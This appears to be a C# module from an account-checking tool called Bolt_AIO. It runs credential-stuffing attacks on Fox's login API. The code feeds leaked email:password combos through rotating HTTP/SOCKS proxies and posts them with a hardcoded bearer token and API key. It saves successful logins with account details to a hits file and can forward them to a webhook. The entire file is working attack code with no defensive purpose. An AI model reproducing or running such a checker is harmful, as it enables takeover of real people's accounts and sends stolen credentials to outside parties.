using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Foxmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.AddHeader("authorization",
                                "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg5REEwNkVEMjAxOCIsInR5cCI6IkpXVCJ9.eyJwaWQiOiJ3ZWI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJ1aWQiOiJkMlZpTnpKa01URXlPVEV0TWpZek5TMDBOek5tTFdFeE5EQXRZelkyTUdNeVpHVm1OV1E1Iiwic2lkIjoiMzcyZGViMWYtNTU5Yi00N2UyLWJkZjAtOTEzMzk4N2JhYzE2Iiwic2RjIjoidXMtZWFzdC0xIiwiYXR5cGUiOiJhbm9ueW1vdXMiLCJkdHlwZSI6IndlYiIsInV0eXBlIjoiZGV2aWNlSWQiLCJkaWQiOiI3MmQxMTI5MS0yNjM1LTQ3M2YtYTE0MC1jNjYwYzJkZWY1ZDkiLCJtdnBkaWQiOiIiLCJ2ZXIiOjIsImV4cCI6MTYzMTUzMjcxNiwianRpIjoiNmM2NmM5YTEtODYzOS00NWIxLWJlYTgtOGNjOGY3OGVkNWZlIiwiaWF0IjoxNTk5OTk2NzE2fQ.hXHKh4tAZ4rLbPsqmFDA99TIThN79ZUZSAlC8S0zSIqnItxRoimOO81edPwuG00rE4O4GNsTKxYxZldFo54P0jcCS4UmRAZoEG0t14T5l0wMoMfdWqJj3elx-aF1QKM8BFWj41LdaTIgCj8xv7n5Xf8LLS3Ibcq7JpLNA1HTrON7nWHvsAge4UpF4C1a3kXS8RPN0VnsFCVgbZOyvH7WXva530unsNFDgt3pfWqua2ukmUwe9YV28hnWXSNzsmzMKecIIp8gYpyEuaJOmiL1lW68PulhqYcsm3wKG0sPvvjfh-7xyveJp1pb5r87OYzWwA1PVjYAE7HZQnnlflNWOg");
                            req.AddHeader("x-api-key", "6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9");
                            req.AddHeader("x-dcg-udid", "72d11291-2635-473f-a140-c660c2def5d9");
                            req.AddHeader("user-agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
                            var str = "{\"password\":\"" + array[1] + "\",\"email\":\"" + array[0] + "\"}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://api3.fox.com/v2.0/login", str,
                                "application/json;charset=UTF-8").ToString();
                            {
                                if (strResponse.Contains("Invalid login credentials"))
                                {
                                    Program.TotalChecks++;
                                    Program.Fails++;
                                }
                                else if (strResponse.Contains("accessToken"))
                                {
                                    var AccountType = Parse(strResponse, "accountType\":\"", "\",\"");
                                    var Brand = Parse(strResponse, "brand\":\"", "\",\"");
                                    var Platform = Parse(strResponse, "platform\":\"", "\",\"");
                                    var Device = Parse(strResponse, "device\":\"", "\",\"");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Fox_hits",
                                        array[0] + ":" + array[1] + " | Account Type: " + AccountType + " | Brand: " +
                                        Brand + " | Platform: " + Platform + " | Device: " + Device);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Fox",
                                            array[0] + ":" + array[1] + " | Account Type: " + AccountType +
                                            " | Brand: " + Brand + " | Platform: " + Platform + " | Device: " + Device);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(
                                            array[0] + ":" + array[1] + " | Account Type: " + AccountType +
                                            " | Brand: " + Brand + " | Platform: " + Platform + " | Device: " + Device,
                                            "Fox hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}